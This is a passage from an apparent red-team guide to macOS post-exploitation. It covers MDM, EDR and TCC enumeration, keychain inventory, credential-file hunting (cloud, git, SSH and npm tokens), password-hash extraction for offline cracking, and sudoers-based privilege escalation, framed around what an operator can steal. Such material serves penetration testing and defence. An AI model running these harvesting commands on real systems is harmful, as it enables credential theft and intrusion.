system_profiler SPHardwareDataType
ioreg -l | grep IOPlatformSerialNumber
ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'
```

The Darwin kernel version is the reliable indicator when `ProductVersion` has been tampered with: Darwin 25.x is macOS 26, 24.x is macOS 15, 23.x is macOS 14, 22.x is macOS 13, 21.x is macOS 12. Note the build string too, because Apple's rapid security responses append a letter and several behaviours below changed in point releases.

The serial number and platform UUID are worth collecting even if you have no immediate use, because they are what MDM and Entra device records key on, and having them lets you correlate a host you are standing on with an entry in a management console you compromise later.

### Management state

This is the highest-value single command on a corporate Mac.

```bash
profiles status -type enrollment
```

```text
Enrolled via DEP: No
MDM enrollment: Yes (User Approved)
MDM server: https://i.manage.microsoft.com/DeviceGatewayProxy/ioshandler.ashx?Platform=MacMDM
```

Three facts in four lines. `Enrolled via DEP: Yes` means Automated Device Enrolment, which means the machine is supervised, which means MDM can do the silent, non-consensual things (PPPC grants, profile installation without approval, remote wipe, activation lock). `MDM enrollment: Yes (User Approved)` without DEP means user-approved MDM: the profile was installed by a human, the machine is not supervised, and a meaningful set of MDM capabilities is unavailable. `MDM enrollment: No` means the machine is unmanaged, which in a corporate environment is itself a finding. The `MDM server` URL identifies the vendor immediately: `manage.microsoft.com` is Intune, a `jamfcloud.com` or on-premises Jamf URL is Jamf Pro, and so on.

Then enumerate what has actually been pushed:

```bash
profiles list                       # installed profiles, current verb syntax
profiles list -all                  # include user-scoped
profiles show -type enrollment
system_profiler SPConfigurationProfileDataType   # profiles with full payload contents
system_profiler SPManagedClientDataType          # effective managed preferences and their source
```

`SPConfigurationProfileDataType` is the good one because it prints payload contents, and payload contents are configuration secrets. On a real Intune-managed machine it yields, among other things, the ACME payload that provisions the device identity certificate:

```text
com.apple.security.acme:
  Identifier: Microsoft.Profiles.ACME
  Payload Data: {
    Attest = 0;
    HardwareBound = 0;
    KeyIsExtractable = 0;
    KeySize = 2048;
    KeyType = RSA;
    DirectoryURL = "https://fef.msua08.manage.microsoft.com/DeviceEnrollmentFE/...";
    Subject = ( ( ( CN, "368118b4-602a-4748-bea5-996be6933915" ) ) );
  }
```

`HardwareBound = 0` and `Attest = 0` mean this device identity key is *not* Secure Enclave bound and *not* attested, which is exactly the condition under which the key is theft-relevant. `KeyIsExtractable = 0` sets the keychain export flag, which is a policy control on the `security export` path and not a hardware guarantee. Read that block on every managed Mac; it tells you whether the machine identity is stealable in one glance. `SPManagedClientDataType` prints every effective managed preference with a `Source:` attribution, which is how you learn what the organisation has actually decided to enforce.

On-disk artefacts, useful when you want to avoid running `profiles` (which is itself logged):

```bash
ls -la /var/db/ConfigurationProfiles/               # .profilesAreInstalled, fdesetup.plist
ls -la /var/db/ConfigurationProfiles/Settings/      # marker files, one per state
# /var/db/ConfigurationProfiles/Store/ holds the profile plists but is TCC/SIP protected
```

The marker files in `Settings/` are zero-length and named for the state they assert. `.cloudConfigHasActivationRecord` versus `.cloudConfigNoActivationRecord` versus `.cloudConfigRecordNotFound` tells you the DEP/ADE status without invoking anything. `com.apple.security.FDERecoveryKeyEscrow.plist` tells you the FileVault personal recovery key is being escrowed and to whom. `com.apple.mdm.enrollmentnotification.plist` and `com.apple.mdm.depnag.plist` relate to the enrolment nagging flow.

Identify the management agent, which is distinct from MDM enrolment. Apple's MDM protocol is agentless and handled by `/usr/libexec/mdmclient`; anything beyond it is a vendor agent, and vendor agents are what execute arbitrary code as root.

```bash
# Jamf
ls -l /usr/local/jamf/bin/jamf /Library/Preferences/com.jamfsoftware.jamf.plist 2>/dev/null
defaults read /Library/Preferences/com.jamfsoftware.jamf.plist jamf_url 2>/dev/null
# Intune
ls -ld "/Library/Intune/Microsoft Intune Agent.app" \
       "/Library/Application Support/Microsoft/Intune" 2>/dev/null
# Munki, Chef, Puppet
ls -ld /usr/local/munki /etc/chef /etc/puppetlabs /opt/puppetlabs 2>/dev/null
defaults read /Library/Preferences/ManagedInstalls.plist SoftwareRepoURL 2>/dev/null
# Anything else: read the daemon list, it is short and self-describing
ls /Library/LaunchDaemons /Library/LaunchAgents
```

The last line is the one to actually rely on, because vendor paths drift and the launchd item list does not lie. On a real corporate Mac it reads like an inventory of the security stack:

```text
/Library/LaunchDaemons/com.microsoft.intuneMDMAgent.daemon.plist
/Library/LaunchDaemons/com.microsoft.fresno.plist                 # Defender for Endpoint
/Library/LaunchDaemons/com.microsoft.dlp.daemon.plist             # Purview DLP
/Library/LaunchDaemons/com.microsoft.wdav.tracer_install_monitor.plist
/Library/LaunchDaemons/com.rapid7.ir_agent.plist                  # InsightIDR agent
/Library/LaunchDaemons/com.paloaltonetworks.gp.pangpsd.plist      # GlobalProtect VPN
/Library/LaunchDaemons/com.fasttracksoftware.admbyreq.plist       # Admin By Request, a PAM tool
```

Note the last one. Privilege-elevation-on-demand products are increasingly common on Macs and they are interesting in two directions: they usually run a root helper reachable over XPC, and they usually log or gate every `sudo`-equivalent action, so both a privesc target and a detection source.

### Installed security tooling

The authoritative check is the system extension list, because every modern macOS EDR is an Endpoint Security system extension. This requires no privilege.

```bash
systemextensionsctl list
```

```text
--- com.apple.system_extension.endpoint_security
enabled  active  teamID      bundleID (version)                              name
*        *       UBF8T346G9  com.microsoft.wdav.epsext (101.26062.0012)      Microsoft Defender Endpoint Security Extension  [activated enabled]
*        *       AU2ALARPUP  com.fasttracksoftware.adminbyrequest.extension  Admin By Request System Extension  [activated enabled]
--- com.apple.system_extension.network_extension
*        *       UBF8T346G9  com.microsoft.wdav.netext (101.26062.0012)      Microsoft Defender Network Extension  [activated enabled]
```

That output tells you exactly which vendors have kernel-adjacent visibility, whether the extension is actually active as opposed to merely installed, and the signing team. Cross-reference with the process list and with what is watching the filesystem:

```bash
ps -axo pid,ppid,uid,command | grep -iE 'falcon|sentinel|wdav|mdatp|jamf|crowdstrike|elastic|carbonblack|cylance|sophos|nessus|osquery|santa'
ls -d /Library/Application\ Support/*/ 2>/dev/null
kextstat 2>/dev/null | grep -v com.apple      # legacy, should be empty on Apple silicon
launchctl print-disabled system | head -40    # what has been administratively disabled
```

Common identifiers to recognise, all of which drift between versions so treat them as hints and confirm with `systemextensionsctl`:

| Product | Typical artefacts |
| --- | --- |
| Microsoft Defender for Endpoint | `/Library/Application Support/Microsoft/Defender`, `wdavdaemon`, `mdatp` CLI, `com.microsoft.wdav.epsext`, `com.microsoft.fresno` daemon |
| CrowdStrike Falcon | `/Library/CS/`, `falcond`, `falconctl` |
| SentinelOne | `/Library/Sentinel/`, `sentineld`, `sentinelctl` |
| Jamf Protect | `/Library/Application Support/JamfProtect/` |
| Elastic Defend | `/Library/Elastic/Endpoint/` |
| Santa | `/Applications/Santa.app`, `santactl`, an allow-listing rather than detection tool |

<!-- VERIFY: vendor paths and process names drift between agent versions -->

Also check Apple's own protections, which are not optional and which people forget about:

```bash
csrutil status
spctl --status
xprotect status            # XProtect launch scans: enabled / background scans: enabled
xprotect version           # signature bundle version
defaults read /Library/Apple/System/Library/CoreServices/XProtect.bundle/Contents/Info.plist \
  CFBundleShortVersionString
/usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate
system_profiler SPFirewallDataType
```

`/usr/bin/xprotect` is a real command on current macOS with `update`, `logs`, `version`, `check` and `status` subcommands. That is worth knowing because most published macOS references predate it.

### Disk encryption and volume layout

```bash
fdesetup status                # FileVault is On.
fdesetup list                  # enabled users. Needs root
diskutil apfs list
diskutil info /                # look for "FileVault: Yes" and the volume roles
mount | grep -E '^/dev'
csrutil authenticated-root status
```

FileVault matters less for a live remote operator than it does for physical access work, but it matters for two specific things: it constrains which accounts you can usefully create (see secure token above), and it means an offline attack on the disk requires a credential you do not have. `diskutil apfs list` also shows you whether the machine has a separate data volume role and whether there are additional encrypted volumes, which on a developer machine sometimes holds a case-sensitive volume with the interesting source trees on it.

### Network position

Standard, but the macOS-specific commands differ enough from Linux that they are worth listing.

```bash
ifconfig -a
netstat -rn                                 # no ip(8) on macOS
scutil --dns                                # resolver configuration, including per-domain
scutil --proxy                              # system proxy, including PAC URL
networksetup -listallhardwareports
networksetup -getinfo Wi-Fi
networksetup -listnetworkserviceorder
lsof -nP -iTCP -sTCP:LISTEN                 # listeners
netstat -an -f inet
arp -an
dscacheutil -q host -a name $TARGET
/usr/libexec/ApplicationFirewall/socketfilterfw --listapps
```

macOS is unusually chatty and unusually well-connected on a corporate network, which is useful. It runs Bonjour/mDNS by default, so `dns-sd -B _services._dns-sd._udp` enumerates advertised services across the local segment without sending anything that looks like a scan. It caches DNS through `mDNSResponder`, so `scutil --dns` shows you split-horizon and VPN-specific resolvers that reveal internal domain structure. And a corporate Mac normally has an always-on VPN or ZTNA client, so the routing table plus `scutil --proxy` plus the tunnel interface tell you what internal ranges the host can reach.

```bash
# Advertised services on the local segment. Passive-looking, uses multicast DNS.
dns-sd -B _services._dns-sd._udp local
timeout 10 dns-sd -B _smb._tcp
timeout 10 dns-sd -B _afpovertcp._tcp
timeout 10 dns-sd -B _ssh._tcp

# What the machine has previously mounted, which is a map of the file server estate.
defaults read com.apple.finder FXRecentFolders 2>/dev/null
mount | grep -E 'smbfs|nfs|afpfs'
```

Mounted and remembered network shares are one of the best pivot indicators on any Mac, because the credentials used to mount them are stored as internet password items in the login keychain (covered under credentials below).

## Enumeration and Discovery

### Property lists

Almost all configuration on macOS is a property list, and property lists come in three encodings: XML, Apple's binary format, and occasionally JSON. `cat` on a binary plist produces garbage, which is the most common newcomer stumble. Two tools handle everything.

```bash
# Convert in place or to stdout. -p is human-readable, -convert changes format.
plutil -p /Library/LaunchDaemons/com.example.thing.plist
plutil -convert xml1 -o - /path/to/binary.plist
plutil -convert json -o - /path/to/thing.plist
plutil -extract ProgramArguments xml1 -o - /path/to/job.plist

# The preferences system, which is not the same as reading the file.
defaults read com.apple.finder
defaults read /Library/Preferences/com.apple.loginwindow
defaults -currentHost read com.apple.screensaver
defaults domains | tr ',' '\n'          # every preference domain on the box
```

The distinction between `defaults` and reading the file directly matters and trips people up. `cfprefsd` caches and coalesces preferences from multiple sources: the file, a managed preference delivered by configuration profile, and the "any host" versus "current host" split. Writing a plist file directly while `cfprefsd` has it cached will be silently overwritten. Use `defaults write` for user preferences, and note that managed preferences delivered by profile win over local ones regardless.

```bash
# Managed preference locations. Profile-delivered settings land here and are
# authoritative over anything a user or you write locally.
ls -la /Library/Managed\ Preferences/ 2>/dev/null
ls -la /Library/Managed\ Preferences/$USER/ 2>/dev/null
```

`/Library/Managed Preferences/` is genuinely useful reconnaissance: it is the organisation's policy, written out in plain plists, readable without privilege, including software update deferrals, password policy, Wi-Fi and VPN configuration hints, and the bundle identifiers the organisation cares enough to manage.

### Directory Services: local accounts and groups

macOS does not use `/etc/passwd` and `/etc/group` for real accounts. It uses Open Directory, and the local node is queried with `dscl`.

```bash
# Every local user, including the underscore-prefixed system accounts.
dscl . -list /Users
dscl . -list /Users UniqueID | sort -k2 -n          # with UIDs, so you can spot real humans
dscl . -list /Users | grep -v '^_'                   # human accounts only

# Everything known about one account.
dscl . -read /Users/$USER
dscl . -read /Users/$USER NFSHomeDirectory UserShell UniqueID PrimaryGroupID \
  AuthenticationAuthority RealName

# Groups and membership, including nested membership resolution.
dscl . -list /Groups
dscl . -read /Groups/admin
dscl . -list /Groups GroupMembership
dsmemberutil checkmembership -U $USER -G admin

# Search a specific attribute across all records. Useful for finding accounts by
# home directory, shell, or a stale AD-style attribute.
dscl . -search /Users UserShell /bin/zsh
dscl . -search /Users NFSHomeDirectory "/Users/*"

# Which directory nodes are in play. This is how you spot AD binding and
# Platform SSO without guessing.
dscl localhost -list /
dscl /Search -read / SearchPath
```

That last command is the important one:

```text
SearchPath:
 /Local/Default
 /Platform SSO
```

`/Local/Default` alone means a purely local machine. An `/Active Directory/DOMAIN` entry means the Mac is bound to AD through Apple's plugin. `/Platform SSO` means the machine is using Platform SSO with an identity provider, which on a Microsoft estate means Entra ID and is a completely different set of opportunities. `/LDAPv3/...` means a directory binding of some other kind.

Password hashes for local accounts live in per-user plists, not in a shadow file, and reading them requires root:

```bash
# Root only. Yields the SALTED-SHA512-PBKDF2 entry, crackable offline.
sudo defaults read /var/db/dslocal/nodes/Default/users/$USER.plist ShadowHashData
sudo plutil -convert xml1 -o - /var/db/dslocal/nodes/Default/users/$USER.plist

# Or through dscl, which formats it more usefully.
sudo dscl . -read /Users/$USER dsAttrTypeNative:ShadowHashData
```

The `ShadowHashData` blob is a nested plist containing the PBKDF2 entry with its salt and iteration count, plus the SRP verifier. It converts to a hashcat-compatible format (mode 7100 for the macOS PBKDF2-SHA512 variant) and is worth cracking, because on macOS the account password is also the login keychain password, and the login keychain is where everything valuable is. That single fact makes offline cracking of a macOS user hash more valuable than cracking a Windows NT hash of comparable strength. <!-- VERIFY: current hashcat mode for macOS ShadowHashData -->

Account policy, useful for knowing whether spraying will lock you out:

```bash
pwpolicy -getaccountpolicies 2>/dev/null
pwpolicy -u $USER -getpolicy 2>/dev/null
dscl . -read /Users/$USER accountPolicyData
```

### Launch services: what runs and when

`launchd` is pid 1 and the only service manager. Everything that runs persistently on macOS is a launchd job, so enumerating launchd jobs is the equivalent of enumerating services, scheduled tasks, and autoruns all at once.

```bash
# The legacy flat listing. Still the fastest triage.
launchctl list
launchctl list | grep -v '^-' | grep -v com.apple    # anything non-Apple with a live PID

# The modern domain-aware view. Verbose but authoritative.
launchctl print system                 # system domain summary
launchctl print gui/$(id -u)           # your GUI session domain
launchctl print user/$(id -u)
launchctl print system/com.example.daemon    # one service, in full detail
launchctl print-disabled system              # administratively disabled services
launchctl blame system/com.example.daemon    # why is this running
launchctl dumpstate                          # everything. Enormous
```

The domain model is the part that differs most from systemd and that people get wrong. From `launchctl help` on current macOS:

| Domain specifier | Meaning |
| --- | --- |
| `system/[service]` | System-wide. Root required to modify. Daemons live here |
| `user/<uid>/[service]` | The per-user domain. The target user or root may modify |
| `gui/<uid>/[service]` | The GUI session domain, associated with a user domain. Agents needing a window server connection live here |
| `session/<asid>/[service]` | A security audit session |
| `pid/<pid>/[service]` | A single process's domain. Only that process may modify it, and explicitly "even root may not do so" |

Then enumerate the plists on disk, which is where persistence lives:

```bash
for d in ~/Library/LaunchAgents /Library/LaunchAgents /Library/LaunchDaemons \
         /System/Library/LaunchAgents /System/Library/LaunchDaemons; do
  echo "=== $d"; ls -la "$d" 2>/dev/null
done

# The high-value view: every non-Apple launchd item with its program and triggers.
for f in /Library/LaunchDaemons/*.plist /Library/LaunchAgents/*.plist \
         ~/Library/LaunchAgents/*.plist; do
  [ -f "$f" ] || continue
  printf '\n--- %s\n' "$f"
  plutil -p "$f" 2>/dev/null | grep -E \
    'Label|Program|RunAtLoad|KeepAlive|StartInterval|StartCalendarInterval|WatchPaths|QueueDirectories|LimitLoadToSessionType|UserName'
done
```

The keys worth reading in every job:

| Key | Meaning and why it matters |
| --- | --- |
| `Label` | Reverse-DNS identifier. Must match for `launchctl` targeting |
| `Program` / `ProgramArguments` | What executes. If the path is writable by you, that is a privilege escalation |
| `RunAtLoad` | Runs immediately when loaded, and at boot or login |
| `KeepAlive` | Restarted when it exits. Boolean or a dictionary of conditions |
| `StartInterval` | Re-run every N seconds |
| `StartCalendarInterval` | Cron-style schedule as a dictionary |
| `WatchPaths` | Started when any listed path changes. If a watched path is writable by you and the job runs as root, that is a trigger you control |
| `QueueDirectories` | Started when a watched directory becomes non-empty. Same abuse, more reliable |
| `LimitLoadToSessionType` | `Aqua`, `Background`, `LoginWindow`, `System`. Controls which session the agent loads in |
| `UserName` / `GroupName` | The identity a daemon runs as |
| `EnvironmentVariables` | Occasionally contains secrets, and occasionally contains a `PATH` you can hijack |
| `MachServices` | The XPC/Mach service names the job exposes. This is your list of IPC attack surface |

`WatchPaths` and `QueueDirectories` on a root daemon, pointing at a directory you can write to, is one of the cleanest privilege escalation primitives on the platform and is chronically under-audited in third-party software.

### Installed applications and their entitlements

```bash
# Everything installed, from the LaunchServices database rather than a directory walk.
system_profiler SPApplicationsDataType 2>/dev/null | head -100
mdfind "kMDItemContentType == 'com.apple.application-bundle'" -onlyin /Applications
ls -la /Applications /Applications/Utilities ~/Applications 2>/dev/null
pkgutil --pkgs                       # installed package receipts
pkgutil --pkg-info <pkgid>
ls -la /var/db/receipts/ | head -40  # receipt plists and BOMs
```

The high-value pass is a signature and entitlement sweep. Do this over every third-party bundle; it produces a ranked list of injection targets in one shot.

```bash
# For each app: hardened runtime, library validation, team ID, and the
# entitlements that relax those protections.
for app in /Applications/*.app; do
  info=$(codesign -dv --verbose=2 "$app" 2>&1)
  flags=$(printf '%s' "$info" | sed -n 's/.*flags=\([^ ]*\).*/\1/p')
  team=$(printf '%s' "$info" | sed -n 's/^TeamIdentifier=//p')
  ents=$(codesign -d --entitlements - "$app" 2>/dev/null \
         | grep -oE 'com\.apple\.security\.(cs\.[a-z-]+|get-task-allow)' | sort -u | tr '\n' ' ')
  printf '%-55s %-40s %s %s\n' "$(basename "$app")" "${flags:-NOFLAGS}" "${team:-NOTEAM}" "$ents"
done
```

Read the output for three things. Bundles with no `library-validation` in the flags are dylib injection targets. Bundles carrying `com.apple.security.cs.disable-library-validation` are injection targets even though they are hardened, and this entitlement is genuinely common because plugin ecosystems need it: office suites, note-taking apps, IDEs, security tools and anything with an extension mechanism routinely ship it. Bundles carrying `com.apple.security.get-task-allow` can be attached to and injected into by anyone.

Cross-reference that list against TCC grants (next) and you have your escalation path. An application that both holds Full Disk Access and lacks library validation is the whole chain in one target.

### Enumerating TCC grants without reading the database

This is the technique to internalise. You cannot read `TCC.db`. You do not need to. `tccd` narrates every decision into the unified log, the log is readable unprivileged, and the log entries include the requesting identity, the service, and the outcome.

```bash
# Every TCC decision in the recent past, with the service and the verdict.
/usr/bin/log show --last 6h --predicate 'subsystem == "com.apple.TCC"' \
  --style compact --info 2>/dev/null

# Which services are being requested, ranked. Fast profile of the machine.
/usr/bin/log show --last 6h --predicate 'subsystem == "com.apple.TCC" \
  AND eventMessage CONTAINS "AUTHREQ_CTX"' --style compact 2>/dev/null \
  | grep -oE 'service=kTCCService[A-Za-z]+' | sort | uniq -c | sort -rn

# Who is being granted what. authValue=2 is allowed, 0 is denied.
/usr/bin/log show --last 24h --predicate 'subsystem == "com.apple.TCC"' \
  --style compact 2>/dev/null \
  | grep -E 'AUTHREQ_ATTRIBUTION|AUTHREQ_RESULT|AUTHREQ_CTX'

# Live: watch a permission being requested and answered in real time.
/usr/bin/log stream --predicate 'subsystem == "com.apple.TCC"' --style compact
```

Correlate `AUTHREQ_CTX` (which service), `AUTHREQ_ATTRIBUTION` (which binary, with its full path and the responsible-process chain), and `AUTHREQ_RESULT` (`authValue`) by the shared `msgID`. What you get is an effective TCC grant table for the machine, built from an unprivileged shell, with no writes and no prompts.

For the specific and very common question "does the terminal I am in have Full Disk Access", the direct test is to touch a TCC-protected path and read the error:

```bash
ls ~/Library/Application\ Support/com.apple.TCC/ >/dev/null 2>&1 \
  && echo "FDA: yes" || echo "FDA: no"
ls ~/Library/Safari >/dev/null 2>&1 && echo "Safari readable: FDA present"
```

`Operation not permitted` on a file you own, from a shell you control, with the correct uid, is always TCC. `Permission denied` is POSIX. Learning to distinguish those two error strings at a glance saves an enormous amount of time on macOS.

Also enumerate what the estate has pre-approved by profile, because MDM-delivered PPPC grants are visible in the profile payloads:

```bash
system_profiler SPConfigurationProfileDataType 2>/dev/null \
  | grep -A40 'com.apple.TCC.configuration-profile-policy'
```

That tells you which bundle identifiers the organisation has silently granted Full Disk Access, Accessibility, and Screen Recording to. Those bundles are your targets, because impersonating or injecting into one inherits a permission that no prompt will ever be shown for.

### Keychain inventory

Inventory first, extract later. Listing keychains and enumerating item metadata does not require the password and does not prompt.

```bash
security list-keychains -d user
security list-keychains -d system
security default-keychain
security login-keychain
security show-keychain-info ~/Library/Keychains/login.keychain-db
```

```bash
ls -la ~/Library/Keychains/ /Library/Keychains/
```

On current macOS that yields both keychain worlds side by side:

```text
~/Library/Keychains/login.keychain-db                      # legacy file format
~/Library/Keychains/metadata.keychain-db
~/Library/Keychains/<UUID>/keychain-2.db                   # data protection keychain (SQLite)
~/Library/Keychains/<UUID>/user.kb                         # the user keybag
/Library/Keychains/System.keychain                         # legacy, machine-wide
/Library/Keychains/system-keychain-2.db                    # data protection, machine-wide
/System/Library/Keychains/SystemRootCertificates.keychain
```

The metadata dump lists every item with its attributes but no secrets, and produces no prompt:

```bash
# Item inventory: class, service, account, creation date. No decryption, no prompt.
security dump-keychain ~/Library/Keychains/login.keychain-db

# Just the service names, which is usually all you need to prioritise.
security dump-keychain 2>/dev/null | grep -A2 '0x00000007 <blob>' | \
  grep '"acct"\|0x00000007' | sed 's/^ *//'
```

What you are looking for in that inventory, on a real corporate machine, is a list of everything worth stealing. Real observed service names include `Chrome Safe Storage`, `Chromium Safe Storage`, `Microsoft Edge Safe Storage`, `Code Safe Storage`, `Zoom Safe Storage`, `1Password:` prefixed items, `gh:github.com` (GitHub CLI), `com.wireguard.macos`, `GlobalProtect` and `GlobalProtectService`, `AdalCache`, `OneAuthAccount`, and `com.microsoft.OutlookCore.ServiceV2`. The `AdalCache` and `OneAuth` items are Microsoft identity broker token caches and are the macOS equivalent of hunting a PRT.

### Browser and application data locations

| Application | Path |
| --- | --- |
| Chrome | `~/Library/Application Support/Google/Chrome/<Profile>/` with `Login Data`, `Login Data For Account`, `Cookies`, `History`, `Web Data`, `Local State` |
| Edge | `~/Library/Application Support/Microsoft Edge/<Profile>/` (identical layout) |
| Brave | `~/Library/Application Support/BraveSoftware/Brave-Browser/<Profile>/` |
| Firefox | `~/Library/Application Support/Firefox/Profiles/<hash>.default*/` with `key4.db`, `logins.json`, `cookies.sqlite`, `places.sqlite` |
| Safari | `~/Library/Safari/` and `~/Library/Containers/com.apple.Safari/Data/` **TCC protected** |
| Safari cookies | `~/Library/Cookies/` and the Safari container. **TCC protected** |
| Messages | `~/Library/Messages/chat.db` **TCC protected** |
| Mail | `~/Library/Mail/` **TCC protected** |
| Notes | `~/Library/Group Containers/group.com.apple.notes/` |
| Slack | `~/Library/Application Support/Slack/` |
| Teams | `~/Library/Group Containers/UBF8T346G9.com.microsoft.teams/` |
| Signal | `~/Library/Application Support/Signal/` |
| Office identity | `~/Library/Group Containers/UBF8T346G9.Office/`, `UBF8T346G9.com.microsoft.oneauth`, `UBF8T346G9.com.microsoft.entrabroker` |
| Recent items and servers | `~/Library/Application Support/com.apple.sharedfilelist/` **TCC protected** |
| Saved window state | `~/Library/Saved Application State/<bundleid>.savedState/` |
| Keyboard and dictation | `~/Library/Keyboard/`, `~/Library/Autosave Information/` |

The TCC-protected markers matter. Apple's own applications are protected; most third-party applications are not, and third-party applications are where the interesting corporate data is. Slack, Teams, Signal and Notion caches are readable by any process running as that user, contain message history and file caches, and require nothing beyond file access. That asymmetry is worth internalising: on macOS the crown jewels are often easier to reach than the built-in Mail app.

Verify quickly which of them you can actually read:

```bash
for p in ~/Library/Safari ~/Library/Messages ~/Library/Mail ~/Library/Cookies \
         ~/Library/Application\ Support/com.apple.sharedfilelist \
         ~/Library/Application\ Support/Slack \
         ~/Library/Group\ Containers/UBF8T346G9.Office; do
  if ls "$p" >/dev/null 2>&1; then echo "READABLE  $p"; else echo "BLOCKED   $p"; fi
done
```

### High-value locations on a developer or executive machine

This is the reason macOS matters in a corporate estate. Developers and executives get Macs, and the two profiles hide different things.

On a **developer** machine, the value is credentials with production reach, and almost none of it is TCC protected:

```bash
# Source trees, which contain committed secrets more often than anyone admits.
ls -d ~/Developer ~/src ~/code ~/repos ~/Projects ~/work ~/git 2>/dev/null
find ~ -maxdepth 4 -name '.git' -type d 2>/dev/null | head -50

# Configuration files that hold tokens. Every one of these is plain file access.
ls -la ~/.aws ~/.azure ~/.config/gcloud ~/.kube ~/.docker ~/.ssh ~/.gnupg 2>/dev/null
cat ~/.netrc ~/.npmrc ~/.pypirc ~/.git-credentials 2>/dev/null
cat ~/.gitconfig ~/.config/git/config 2>/dev/null
ls -la ~/.gradle/gradle.properties ~/.m2/settings.xml ~/.cargo/credentials* \
       ~/.terraformrc ~/.terraform.d/credentials.tfrc.json 2>/dev/null
cat ~/.zshrc ~/.zprofile ~/.zshenv ~/.bash_profile ~/.bashrc ~/.profile 2>/dev/null
ls -la ~/.config/ 2>/dev/null

# Editors and IDEs, which cache tokens and remote host configuration.
ls -la ~/Library/Application\ Support/Code/User/ 2>/dev/null
ls -la ~/.vscode/extensions ~/Library/Application\ Support/JetBrains 2>/dev/null
ls -la ~/.ssh/config ~/.ssh/known_hosts 2>/dev/null

# Homebrew, which on many machines has re-owned /usr/local to the user.
ls -ld /usr/local /usr/local/bin /opt/homebrew /opt/homebrew/bin 2>/dev/null
brew --prefix 2>/dev/null

# Environment files and secret sprawl in project trees.
find ~ -maxdepth 5 \( -name '.env' -o -name '.env.*' -o -name 'secrets.yml' \
  -o -name 'credentials.json' -o -name '*.pem' -o -name 'id_rsa' \
  -o -name 'terraform.tfstate' \) 2>/dev/null | head -60
```

On an **executive** machine, the value is documents, correspondence, and access to other people:

```bash
ls -la ~/Desktop ~/Documents ~/Downloads 2>/dev/null
ls -la ~/Library/CloudStorage/ 2>/dev/null     # OneDrive, Dropbox, Box, Google Drive mounts
ls -la ~/Library/Mobile\ Documents/ 2>/dev/null # iCloud Drive
mdfind -onlyin ~ 'kMDItemFSName == "*password*"' 2>/dev/null | head -30
mdfind -onlyin ~ 'kMDItemTextContent == "*password*"cd' 2>/dev/null | head -30
mdfind 'kMDItemFSName == "*.kdbx" || kMDItemFSName == "*.1pux"' 2>/dev/null
```

`mdfind` is genuinely the best file-hunting tool on macOS and is chronically underused. It queries the Spotlight index rather than walking the filesystem, so it is fast, it searches file *contents* as well as names, and it does not generate the storm of filesystem events that a `find /` does. `kMDItemTextContent == "..."cd` is a case-insensitive, diacritic-insensitive content search. On a machine with a healthy Spotlight index it will find the spreadsheet of passwords in seconds. Note that Spotlight respects TCC and will not return contents from protected locations to an unprivileged process, and that `~/Library` is excluded from default Spotlight indexing.

`~/Library/CloudStorage/` deserves a specific callout. It is where modern macOS mounts OneDrive, Google Drive, Dropbox and Box through the File Provider API, and on a corporate Mac it is frequently a live, writable, locally mounted view of the organisation's entire cloud document estate. Enumerating it is often more productive than any amount of file server hunting.

## Privilege Escalation on macOS

### The privilege ladder

There are more rungs on macOS than on Linux, and they are not strictly ordered. Map where you are before choosing a technique.

| Rung | What it means | Typical way up |
| --- | --- | --- |
| Sandboxed process | A consenting application's confinement | Escape via an XPC service or a helper with weaker confinement |
| Standard user | Normal uid, no `admin` group | A privileged helper bug, a writable launch item, a setuid bug, or credential theft |
| Standard user with a TCC grant | Same uid, but able to read protected data | Often more valuable than admin |
| Member of `admin` (gid 80) | Can `sudo`, can satisfy admin authorisation rights, can write `/Applications` | `sudo` |
| root | uid 0 | Already there |
| root with Full Disk Access | Can read everything including the TCC databases | A granted parent process, an MDM PPPC push, or a granted application's identity |
| SIP disabled | Can modify the OS, debug system processes | recoveryOS, physical presence. Out of reach remotely |

Note that "root with Full Disk Access" is above plain root, and that "standard user with a TCC grant" can be more useful than admin. The ladder is not linear, and a lot of macOS work is sideways movement to acquire a permission rather than upward movement to acquire a privilege.

### Admin to root

The good news for the operator is that admin to root is normally trivial. The bad news, if you were expecting Linux, is that the folklore about what admins can write is wrong on current macOS, and repeating it wastes time.

**The default route is `sudo`.** Apple's default `/etc/sudoers` grants the `admin` group unrestricted sudo. There is no separate `wheel` gating as on some Linux distributions, and membership of gid 80 is functionally equivalent to full root given the account password. Confirm the sudoers configuration if you can read it, and always check the drop-in directory:

```bash
sudo -l -n 2>/dev/null                       # non-interactive: succeeds only if NOPASSWD
sudo cat /etc/sudoers 2>/dev/null | grep -vE '^#|^$'
ls -la /etc/sudoers.d/
cat /etc/sudoers.d/* 2>/dev/null
```

`/etc/sudoers.d/` is empty on a stock install but is a legitimate extension point that enterprise software uses freely. Container runtimes, VPN clients, developer tooling and privilege-elevation products all drop rules there, and a badly scoped `NOPASSWD` rule pointing at a wrapper script or an interpreter is a direct, credential-free path to root. This is the single highest-yield check on a managed Mac and it takes one second.

**What admin does NOT get you, contrary to most published material.** Measured on current macOS:

| Path | Owner and group | Mode | Writable by `admin`? |
| --- | --- | --- | --- |
| `/Applications` | `root:admin` | `drwxrwxr-x` | **Yes** |
| `/Library` | `root:wheel` | `drwxr-xr-x` | No |
| `/Library/LaunchDaemons` | `root:wheel` | `drwxr-xr-x` | No |
| `/Library/LaunchAgents` | `root:wheel` | `drwxr-xr-x` | No |
| `/Library/PrivilegedHelperTools` | `root:wheel` | `drwxr-xr-x` | No |
| `/Library/Preferences` | `root:wheel` | `drwxr-xr-x` | No |
| `/Library/Security/SecurityAgentPlugins` | `root:wheel` | `drwxr-xr-x` | No |
| `/usr/local` | `root:wheel` | `drwxr-xr-x` | No, stock |

**Common mistake.** A great deal of macOS tradecraft asserts that the `admin` group can write to `/Library` and therefore drop a launch daemon plist without root. On current macOS that is false: `/Library` and every subdirectory that matters are `root:wheel 755`. Only `/Applications` is group-writable by `admin`, which is why an admin can drag-install an application bundle without authenticating. If you are admin and want a launch daemon, you need root first, which means `sudo`, which means the password or a NOPASSWD rule. Verify with `ls -ld` on the target machine rather than assuming either way, because these permissions have changed across releases.

**Homebrew is the exception worth checking.** Homebrew's installer takes ownership of its prefix. On an Intel Mac that prefix is `/usr/local`, so a machine with Homebrew often has a user-writable `/usr/local/bin` sitting early in `PATH`, which is a straightforward path-hijacking primitive against anything root runs with an inherited `PATH`. On Apple silicon the prefix is `/opt/homebrew`, which is not on the default root `PATH`, so the same trick is weaker.

```bash
ls -ld /usr/local /usr/local/bin /usr/local/sbin /opt/homebrew/bin 2>/dev/null
